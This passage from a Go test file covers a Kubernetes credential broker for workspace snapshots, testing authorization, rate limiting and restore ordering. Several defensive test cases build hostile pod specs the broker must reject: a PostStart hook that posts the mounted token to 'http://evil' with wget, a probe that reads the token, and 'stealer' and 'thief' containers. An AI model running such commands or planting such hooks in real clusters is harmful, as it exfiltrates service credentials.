						wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"}}},
					&corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "maint-pod", UID: "mtp", Labels: map[string]string{wsnapv1.LabelJob: "maintenance"},
						OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-maint-x", UID: "maint-uid", Controller: ptr.To(true)}}}})
				var cur wsnapv1.Workspace
				_ = m.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &cur)
				cur.Status.Jobs = append(cur.Status.Jobs, wsnapv1.JobRef{Name: "wsnap-maint-x", UID: "maint-uid", Kind: "maintenance"})
				_ = m.client.Status().Update(context.Background(), &cur)
				if _, r := m.call(t, "/v1/credentials", "token-maint-pod", protocol.CredentialsRequest{Role: protocol.RoleMaintenance}); !slices.Contains(r.KeepIDs, "mover-snap") {
					t.Fatalf("maintenance keep %v; the superseded rescue would be deleted", r.KeepIDs)
				}
			}
			// A restore reads what the broker recorded, not the engine's newest.
			e2 := newEnv(t, workloadPod("w9", "u9", "ws1"), &ws)
			if _, r := e2.call(t, "/v1/credentials", "token-w9", protocol.CredentialsRequest{Role: protocol.RoleRestore}); r.LatestSnapshotID != tc.wantLatest {
				t.Fatalf("restore got latest %q, want %q", r.LatestSnapshotID, tc.wantLatest)
			}
		})
	}
}

// TestJobPodMustRunTheJobTemplate (reviewer #3 finding 3): an
// ownerReference to a registered Job is not enough.
func TestJobPodMustRunTheJobTemplate(t *testing.T) {
	agent := corev1.Container{Name: "wsnap", Image: "wsnap-agent:dev", Args: []string{"maintain"},
		VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-token", MountPath: "/t"}}}
	tokenVol := corev1.Volume{Name: "wsnap-token", VolumeSource: corev1.VolumeSource{Projected: &corev1.ProjectedVolumeSource{
		Sources: []corev1.VolumeProjection{{ServiceAccountToken: &corev1.ServiceAccountTokenProjection{Audience: "wsnap", Path: "token"}}}}}}
	stateVol := corev1.Volume{Name: "wsnap-state", VolumeSource: corev1.VolumeSource{EmptyDir: &corev1.EmptyDirVolumeSource{}}}
	agent.VolumeMounts = append(agent.VolumeMounts, corev1.VolumeMount{Name: "wsnap-state", MountPath: "/var/lib/wsnap"})
	tmpl := corev1.PodSpec{Containers: []corev1.Container{agent}, Volumes: []corev1.Volume{tokenVol, stateVol}}
	vols := tmpl.Volumes
	evil := agent
	evil.Image = "attacker/image"
	hooked := agent
	hooked.Lifecycle = &corev1.Lifecycle{PostStart: &corev1.LifecycleHandler{Exec: &corev1.ExecAction{Command: []string{"sh", "-c", "wget --post-file=/t/token http://evil"}}}}
	probed := agent
	probed.ReadinessProbe = &corev1.Probe{ProbeHandler: corev1.ProbeHandler{Exec: &corev1.ExecAction{Command: []string{"cat", "/t/token"}}}}
	sidecarMesh := corev1.Container{Name: "mesh-proxy", Image: "mesh:1"}
	stealer := corev1.Container{Name: "stealer", Image: "x", VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-token", MountPath: "/t"}}}
	// Kopia keeps the storage credential in the state volume (reviewer #5).
	stateThief := corev1.Container{Name: "thief", Image: "x", VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-state", MountPath: "/s"}}}
	for _, tc := range []struct {
		name string
		spec corev1.PodSpec
		done bool
		want int
	}{
		{"the job's own pod", tmpl, false, 200},
		{"an admission webhook added a container", corev1.PodSpec{Containers: []corev1.Container{agent, sidecarMesh}, Volumes: vols}, false, 200},
		{"another image", corev1.PodSpec{Containers: []corev1.Container{evil}, Volumes: vols}, false, 403},
		// Reviewer #6: hooks and probes run inside the agent container.
		{"an exec hook on the agent", corev1.PodSpec{Containers: []corev1.Container{hooked}, Volumes: vols}, false, 403},
		{"an exec probe on the agent", corev1.PodSpec{Containers: []corev1.Container{probed}, Volumes: vols}, false, 403},
		{"an extra container reads the token", corev1.PodSpec{Containers: []corev1.Container{agent, stealer}, Volumes: vols}, false, 403},
		{"an extra container reads the state volume", corev1.PodSpec{Containers: []corev1.Container{agent, stateThief}, Volumes: vols}, false, 403},
		{"shared process namespace", corev1.PodSpec{Containers: []corev1.Container{agent}, Volumes: vols, ShareProcessNamespace: ptr.To(true)}, false, 403},
		{"the job finished", tmpl, true, 403},
	} {
		t.Run(tc.name, func(t *testing.T) {
			job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-maint-x", UID: "job-uid",
				Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "maintenance",
					wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"}},
				Spec: batchv1.JobSpec{Template: corev1.PodTemplateSpec{Spec: tmpl}}}
			if tc.done {
				job.Status.Conditions = []batchv1.JobCondition{{Type: batchv1.JobComplete, Status: corev1.ConditionTrue}}
			}
			pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "maint-pod", UID: "mp",
				Labels:          map[string]string{wsnapv1.LabelJob: "maintenance"},
				OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-maint-x", UID: "job-uid", Controller: ptr.To(true)}}},
				Spec: tc.spec}
			e := newEnv(t, job, pod, &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
				Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{{Name: "wsnap-maint-x", UID: "job-uid", Kind: "maintenance"}}}})
			if rec, _ := e.call(t, "/v1/credentials", "token-maint-pod", protocol.CredentialsRequest{Role: protocol.RoleMaintenance}); rec.Code != tc.want {
				t.Fatalf("status %d, want %d: %s", rec.Code, tc.want, rec.Body.String())
			}
		})
	}
}

// TestMaintenanceKeepsPinnedSnapshots (reviewer #3 finding 8).
func TestMaintenanceKeepsPinnedSnapshots(t *testing.T) {
	job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-maint-x", UID: "job-uid",
		Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "maintenance",
			wsnapv1.LabelJobWorkspace: "parent", wsnapv1.LabelRepository: "repo"}}}
	pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "maint-pod", UID: "mp",
		Labels:          map[string]string{wsnapv1.LabelJob: "maintenance"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-maint-x", UID: "job-uid", Controller: ptr.To(true)}}}}
	wsObj := func(name string, rf *wsnapv1.RestoreSource, last string) *wsnapv1.Workspace {
		w := &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo", RestoreFrom: rf}}
		if last != "" {
			w.Status.LastSnapshot = &wsnapv1.SnapshotRecord{ID: last}
		}
		return w
	}
	parent := wsObj("parent", &wsnapv1.RestoreSource{SnapshotID: "rollback-target"}, "newest")
	parent.Status.Jobs = []wsnapv1.JobRef{{Name: "wsnap-maint-x", UID: "job-uid", Kind: "maintenance"}}
	restore := func(name, src, id, phase string) *wsnapv1.WorkspaceRestore {
		return &wsnapv1.WorkspaceRestore{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name},
			Spec:   wsnapv1.WorkspaceRestoreSpec{WorkspaceName: "child2", SourceWorkspace: src, SnapshotID: id},
			Status: wsnapv1.WorkspaceSnapshotStatus{Phase: phase}}
	}
	e := newEnv(t, job, pod, parent,
		wsObj("child", &wsnapv1.RestoreSource{WorkspaceName: "parent", SnapshotID: "fork-point"}, "child-own"),
		wsObj("other", &wsnapv1.RestoreSource{WorkspaceName: "elsewhere", SnapshotID: "not-ours"}, ""),
		restore("r1", "parent", "pending-restore", wsnapv1.SnapshotPending),
		restore("r2", "parent", "finished-restore", wsnapv1.SnapshotSucceeded))
	rec, r := e.call(t, "/v1/credentials", "token-maint-pod", protocol.CredentialsRequest{Role: protocol.RoleMaintenance})
	if rec.Code != 200 {
		t.Fatalf("%d %s", rec.Code, rec.Body.String())
	}
	slices.Sort(r.KeepIDs)
	want := []string{"fork-point", "newest", "pending-restore", "rollback-target"}
	if !slices.Equal(r.KeepIDs, want) {
		t.Fatalf("keep %v, want %v", r.KeepIDs, want)
	}
}

// TestTransientAPIErrorsAreRetryable (reviewer #3 finding 4).
func TestTransientAPIErrorsAreRetryable(t *testing.T) {
	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
	e.srv.Auth = failingAuth{}
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != http.StatusServiceUnavailable {
		t.Fatalf("TokenReview outage answered %d, want 503", rec.Code)
	}
	calls := 0
	c := &CachingAuthenticator{Next: outageAuth{&calls}, TTL: time.Minute}
	for range 2 {
		_, _ = c.Authenticate(context.Background(), "t")
	}
	if calls != 2 {
		t.Fatalf("an outage was cached: %d TokenReviews for 2 requests", calls)
	}
}

type failingAuth struct{}

func (failingAuth) Authenticate(context.Context, string) (Identity, error) {
	return Identity{}, fmt.Errorf("%w: connection refused", ErrAuthUnavailable)
}

type outageAuth struct{ n *int }

func (a outageAuth) Authenticate(context.Context, string) (Identity, error) {
	*a.n++
	return Identity{}, fmt.Errorf("%w: timeout", ErrAuthUnavailable)
}

// TestJobWaitsForWorkloadOnItsVolume (reviewer #4 finding 2): the broker's
// half of "one agent per volume".
func TestJobWaitsForWorkloadOnItsVolume(t *testing.T) {
	job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-reqs-x", UID: "job-uid",
		Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "mover",
			wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"},
		Annotations: map[string]string{wsnapv1.AnnotationVolumeName: "pv-1"}}}
	jobPod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "mover-pod", UID: "mp",
		Labels:          map[string]string{wsnapv1.LabelJob: "mover"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-reqs-x", UID: "job-uid", Controller: ptr.To(true)}}}}
	writer := workloadPod("w1", "u1", "ws1", func(p *corev1.Pod) { p.Status.Phase = corev1.PodPending })
	claim := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-w1"}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-1"}}
	wsObj := &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
		Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{{Name: "wsnap-reqs-x", UID: "job-uid", Kind: "mover"}}}}
	e := newEnv(t, job, jobPod, writer, claim, wsObj)
	if rec, _ := e.call(t, "/v1/credentials", "token-mover-pod", protocol.CredentialsRequest{Role: protocol.RoleMover}); rec.Code != http.StatusConflict {
		t.Fatalf("mover got %d while a starting writer uses its volume, want 409", rec.Code)
	}
	writer.Status.Phase = corev1.PodSucceeded
	if err := e.client.Status().Update(context.Background(), writer); err != nil {
		t.Fatal(err)
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-mover-pod", protocol.CredentialsRequest{Role: protocol.RoleMover}); rec.Code != 200 {
		t.Fatalf("mover got %d after the writer stopped: %s", rec.Code, rec.Body.String())
	}
}

// TestLostCreateRaceUsesTheWinnersWorkspace (reviewer #4 finding 8).
func TestLostCreateRaceUsesTheWinnersWorkspace(t *testing.T) {
	e := newEnv(t, workloadPod("w1", "u1", "child"),
		&wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "parent"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
			Status: wsnapv1.WorkspaceStatus{LastSnapshot: &wsnapv1.SnapshotRecord{ID: "p1"}}})
	// The first read misses the Workspace; the user creates it (with a
	// fork source) before the broker's Create.
	e.srv.Reader = &missOnce{Client: e.client, create: &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "child", Generation: 1},
		Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo", RestoreFrom: &wsnapv1.RestoreSource{WorkspaceName: "parent"}}}}
	_, r := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore})
	if r.SourceWorkspace != "parent" || r.LatestSnapshotID != "p1" {
		t.Fatalf("restore source %q latest %q; the fork was ignored", r.SourceWorkspace, r.LatestSnapshotID)
	}
}

// missOnce answers the first Workspace read with NotFound, after creating
// the Workspace behind the caller's back.
type missOnce struct {
	client.Client
	create *wsnapv1.Workspace
	done   bool
}

func (m *missOnce) Get(ctx context.Context, key client.ObjectKey, obj client.Object, opts ...client.GetOption) error {
	if _, ok := obj.(*wsnapv1.Workspace); ok && !m.done && key.Name == m.create.Name {
		m.done = true
		if err := m.Client.Create(ctx, m.create.DeepCopy()); err != nil {
			return err
		}
		return apierrors.NewNotFound(wsnapv1.GroupVersion.WithResource("workspaces").GroupResource(), key.Name)
	}
	return m.Client.Get(ctx, key, obj, opts...)
}

// TestRestoreWaitsForAStoppedWritersBoundVolume (reviewer #4 finding 5):
// writer A failed (hard eviction: no final snapshot) and its claim is
// still bound. Pod B must not restore the older lastSnapshot until A's
// volume is saved.
func TestRestoreWaitsForAStoppedWritersBoundVolume(t *testing.T) {
	failedA := workloadPod("a", "uA", "ws1", func(p *corev1.Pod) { p.Status.Phase = corev1.PodFailed })
	pvA := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-a", Annotations: map[string]string{
		wsnapv1.AnnotationWorkspaceRef: ns + "/ws1", workspace.AnnotationWriterPod: "uA"}},
		Spec:   corev1.PersistentVolumeSpec{ClaimRef: &corev1.ObjectReference{Namespace: ns, Name: "data-a"}},
		Status: corev1.PersistentVolumeStatus{Phase: corev1.VolumeBound}}
	claimA := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-a"}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-a"}}
	e := newEnv(t, failedA, pvA, claimA, workloadPod("b", "uB", "ws1"),
		&wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
			Status: wsnapv1.WorkspaceStatus{WriterPod: &wsnapv1.PodRef{Name: "a", UID: "uA"}, LastSnapshot: &wsnapv1.SnapshotRecord{ID: "stale"}}})
	if rec, _ := e.call(t, "/v1/credentials", "token-b", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != http.StatusConflict {
		t.Fatalf("restore got %d while a stopped writer's volume holds unsaved data, want 409", rec.Code)
	}
	var reqs wsnapv1.WorkspaceSnapshotList
	_ = e.client.List(context.Background(), &reqs)
	if len(reqs.Items) != 1 || reqs.Items[0].Annotations[wsnapv1.AnnotationVolumeName] != "pv-a" {
		t.Fatalf("rescue request %+v, want one targeting pv-a", reqs.Items)
	}
	// The mover saved it: the broker marked the PV final.
	pvA.Annotations[workspace.AnnotationFinalPod] = "uA"
	_ = e.client.Update(context.Background(), pvA)
	if rec, _ := e.call(t, "/v1/credentials", "token-b", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
		t.Fatalf("restore got %d after the volume was saved: %s", rec.Code, rec.Body.String())
	}
}

// TestGarbageTokensDoNotFloodTheAPIServer (reviewer #5 finding 2, revised
// after reviewer #6 finding 9): random bearer tokens from one client cost
// at most its per-IP TokenReview budget; a valid token the broker already
// knows is never limited, so the flood cannot lock out the sidecar.
func TestGarbageTokensDoNotFloodTheAPIServer(t *testing.T) {
	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
	reviews := 0
	auth := &CachingAuthenticator{Next: countValid{n: &reviews, valid: e.srv.Auth}, TTL: time.Minute}
	e.srv.Auth = auth
	// The sidecar's token is validated once (cached).
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("sidecar: %d", rec.Code)
	}
	for i := range 500 {
		e.call(t, "/v1/credentials", fmt.Sprintf("garbage-%d", i), protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	}
	if reviews > 20 {
		t.Fatalf("500 garbage tokens from one client caused %d TokenReviews", reviews)
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("the sidecar's known token got %d after the flood, want 200", rec.Code)
	}
	reviews = 0
	capped := &CachingAuthenticator{Next: rejectAll{&reviews}, TTL: time.Minute, Reviews: rate.NewLimiter(0, 5)}
	for i := range 100 {
		_, _ = capped.Authenticate(context.Background(), fmt.Sprintf("t-%d", i))
	}
	if reviews != 5 {
		t.Fatalf("the global cap let %d TokenReviews through, want 5", reviews)
	}
}

// countValid counts reviews and defers to valid for known test tokens.
type countValid struct {
	n     *int
	valid Authenticator
}

func (a countValid) Authenticate(ctx context.Context, token string) (Identity, error) {
	*a.n++
	return a.valid.Authenticate(ctx, token)
}

type rejectAll struct{ n *int }

func (a rejectAll) Authenticate(context.Context, string) (Identity, error) {
	*a.n++
	return Identity{}, fmt.Errorf("token rejected")
}

// TestTargetedRequestIsNotClaimedBySidecar (reviewer #5 suspicion): a
// rescue request for a stopped writer's volume must go to a Job.
func TestTargetedRequestIsNotClaimedBySidecar(t *testing.T) {
	targeted := &wsnapv1.WorkspaceSnapshot{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-unsaved-x",
		Annotations: map[string]string{wsnapv1.AnnotationVolumeName: "pv-old"}},
		Spec: wsnapv1.WorkspaceSnapshotSpec{WorkspaceName: "ws1"}, Status: wsnapv1.WorkspaceSnapshotStatus{Phase: wsnapv1.SnapshotPending}}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), targeted)
	e.srv.Client = &statusCompat{e.client}
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	resp, err := e.srv.claimRequests(context.Background(), &caller{pod: workloadPod("w1", "u1", "ws1"), id: workspace.Identity{Namespace: ns, Name: "ws1", Repository: "repo"}})
	if err != nil {
		t.Fatal(err)
	}
	if len(resp.Requests) != 0 {
		t.Fatalf("the sidecar claimed a request for another volume: %v", resp.Requests)
	}
}

// TestLostWriterVolumeIsRescuedWithoutBlocking (reviewer #6 finding 2): a
// writer stuck terminating on a lost node still holds unsaved data. The
// broker asks for its rescue (kept as superseded when it lands) and lets
// the replacement start instead of skipping the rescue entirely.
func TestLostWriterVolumeIsRescuedWithoutBlocking(t *testing.T) {
	stuckA := workloadPod("a", "uA", "ws1", func(p *corev1.Pod) {
		p.DeletionTimestamp = ptr.To(metav1.NewTime(time.Now().Add(-time.Hour)))
		p.Finalizers = []string{"test/keep"}
	})
	pvA := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-a", Annotations: map[string]string{
		wsnapv1.AnnotationWorkspaceRef: ns + "/ws1", workspace.AnnotationWriterPod: "uA"}},
		Spec:   corev1.PersistentVolumeSpec{ClaimRef: &corev1.ObjectReference{Namespace: ns, Name: "data-a"}},
		Status: corev1.PersistentVolumeStatus{Phase: corev1.VolumeBound}}
	claimA := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-a"}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-a"}}
	e := newEnv(t, stuckA, pvA, claimA, workloadPod("b", "uB", "ws1"),
		&wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
			Status: wsnapv1.WorkspaceStatus{WriterPod: &wsnapv1.PodRef{Name: "a", UID: "uA"}, LastSnapshot: &wsnapv1.SnapshotRecord{ID: "stale"}}})
	if rec, _ := e.call(t, "/v1/credentials", "token-b", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
		t.Fatalf("restore got %d; a lost node must not block the replacement: %s", rec.Code, rec.Body.String())
	}
	var reqs wsnapv1.WorkspaceSnapshotList
	_ = e.client.List(context.Background(), &reqs)
	if len(reqs.Items) != 1 || reqs.Items[0].Annotations[wsnapv1.AnnotationVolumeName] != "pv-a" {
		t.Fatalf("no rescue request for the lost writer's volume: %+v", reqs.Items)
	}
}

// TestUnsetOperationTimeoutIsNotSent: an unset spec.operationTimeout must
// not override the agent's --operation-timeout with the default (found by
// the e2e storage-outage scenario).
func TestUnsetOperationTimeoutIsNotSent(t *testing.T) {
	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
	if _, r := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore}); r.OperationTimeout.Duration != 0 {
		t.Fatalf("broker sent operationTimeout %s for a repository that sets none", r.OperationTimeout.Duration)
	}
}

// workerEnv has a worker-mode workspace, its workload Pod on node-a, and a
// registered worker Job whose Pod shares the workload's claim.
func workerEnv(t *testing.T) (*env, *corev1.Pod) {
	t.Helper()
	app := workloadPod("app", "app-uid", "ws1", func(p *corev1.Pod) {
		p.Spec.NodeName = "node-a"
		p.Spec.InitContainers = []corev1.Container{{Name: "wsnap-gate",
			VolumeMounts: []corev1.VolumeMount{{Name: "workspace", MountPath: "/workspace", ReadOnly: true}}}}
		p.Spec.Volumes = p.Spec.Volumes[:1] // no wsnap token in a worker-mode workload
	})
	claim := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-app", UID: "claim-uid"},
		Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-app"}}
	pv := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-app", UID: "pv-uid"},
		Spec: corev1.PersistentVolumeSpec{ClaimRef: &corev1.ObjectReference{Namespace: ns, Name: "data-app", UID: "claim-uid"}}}
	vols := []corev1.Volume{{Name: "workspace", VolumeSource: corev1.VolumeSource{
		PersistentVolumeClaim: &corev1.PersistentVolumeClaimVolumeSource{ClaimName: "data-app"}}}}
	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-worker-x", UID: "worker-job-uid",
			Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "worker",
				wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"},
			Annotations: map[string]string{wsnapv1.AnnotationTargetPodName: "app", wsnapv1.AnnotationTargetPodUID: "app-uid",
				wsnapv1.AnnotationVolumeName: "pv-app", workspace.AnnotationClaimUID: "claim-uid", workspace.AnnotationPVUID: "pv-uid"}},
		Spec: batchv1.JobSpec{Template: corev1.PodTemplateSpec{Spec: corev1.PodSpec{Volumes: vols}}},
	}
	worker := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "worker-pod", UID: "wp",
		Labels:          map[string]string{wsnapv1.LabelJob: "worker"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: job.Name, UID: job.UID, Controller: ptr.To(true)}}},
		Spec: corev1.PodSpec{NodeName: "node-a", Volumes: vols}}
	ws := &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"},
		Spec:   wsnapv1.WorkspaceSpec{RepositoryName: "repo", Execution: wsnapv1.WorkspaceExecutionSpec{Mode: wsnapv1.ExecutionWorker}},
		Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{workspace.JobRef(job)}}}
	return newEnv(t, app, claim, pv, job, worker, ws), app
}

func workerStop(t *testing.T, e *env) bool {
	t.Helper()
	rec, _ := e.call(t, "/v1/worker-state", "token-worker-pod", struct{}{})
	if rec.Code != http.StatusOK {
		t.Fatalf("worker-state: %d %s", rec.Code, rec.Body.String())
	}
	var st struct{ Stop bool }
	_ = json.Unmarshal(rec.Body.Bytes(), &st)
	return st.Stop
}

func TestWorkerServesItsWorkload(t *testing.T) {
	e, _ := workerEnv(t)
	if rec, _ := e.call(t, "/v1/credentials", "token-worker-pod", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
		t.Fatalf("worker restore before the workload started: %d %s", rec.Code, rec.Body.String())
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-worker-pod", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("worker snapshot: %d %s", rec.Code, rec.Body.String())
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-app", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != http.StatusForbidden {
		t.Errorf("a worker-mode workload Pod got a credential: %d", rec.Code)
	}
	var ws wsnapv1.Workspace
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws)
	if ws.Status.WriterPod == nil || ws.Status.WriterPod.UID != "app-uid" || ws.Status.Jobs[0].WriterEpoch != ws.Status.WriterEpoch {
		t.Fatalf("writer %+v, job epoch %d, workspace epoch %d", ws.Status.WriterPod, ws.Status.Jobs[0].WriterEpoch, ws.Status.WriterEpoch)
	}
	rec, _ := e.call(t, "/v1/report", "token-worker-pod", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot,
		SnapshotID: "s1", EndTime: time.Now()})
	if rec.Code != http.StatusNoContent {
		t.Fatalf("worker report: %d %s", rec.Code, rec.Body.String())
	}
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws)
	if l := ws.Status.LastSnapshot; l == nil || l.Executor != "worker" || l.Epoch != ws.Status.WriterEpoch || l.Pod.UID != "app-uid" {
		t.Fatalf("lastSnapshot = %+v", ws.Status.LastSnapshot)
	}
}

// A worker outlives its workload to take the final snapshot. A missing
// workload, or a new Pod that reuses its name, means the workload stopped;
// refusing the worker would leave it, and the volume, stuck.
func TestWorkerSeesItsWorkloadStop(t *testing.T) {
	ctx := context.Background()
	e, app := workerEnv(t)
	if rec, _ := e.call(t, "/v1/credentials", "token-worker-pod", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("worker snapshot: %d %s", rec.Code, rec.Body.String())
	}
	if workerStop(t, e) {
		t.Fatal("stop while the workload runs")
	}
	if err := e.client.Delete(ctx, app); err != nil {
		t.Fatal(err)
	}
	replacement := app.DeepCopy()
	replacement.ResourceVersion, replacement.UID = "", "app-uid-2"
	if err := e.client.Create(ctx, replacement); err != nil {
		t.Fatal(err)
	}
	if !workerStop(t, e) {
		t.Fatal("a same-name replacement Pod kept the old worker running")
	}
	rec, _ := e.call(t, "/v1/report", "token-worker-pod", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot,
		SnapshotID: "final", Final: true, EndTime: time.Now()})
	if rec.Code != http.StatusNoContent {
		t.Fatalf("final report after the workload stopped: %d %s", rec.Code, rec.Body.String())
	}
}

func TestWorkerMustShareItsWorkloadsVolume(t *testing.T) {
	ctx := context.Background()
	e, _ := workerEnv(t)
	var claim corev1.PersistentVolumeClaim
	if err := e.client.Get(ctx, types.NamespacedName{Namespace: ns, Name: "data-app"}, &claim); err != nil {
		t.Fatal(err)
	}
	claim.UID = "replacement-claim"
	if err := e.client.Update(ctx, &claim); err != nil {
		t.Fatal(err)
	}
	if rec, _ := e.call(t, "/v1/credentials", "token-worker-pod", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code < 400 || rec.Code >= 500 {
		t.Fatalf("worker got a credential for a replaced claim: %d %s", rec.Code, rec.Body.String())
	}
}
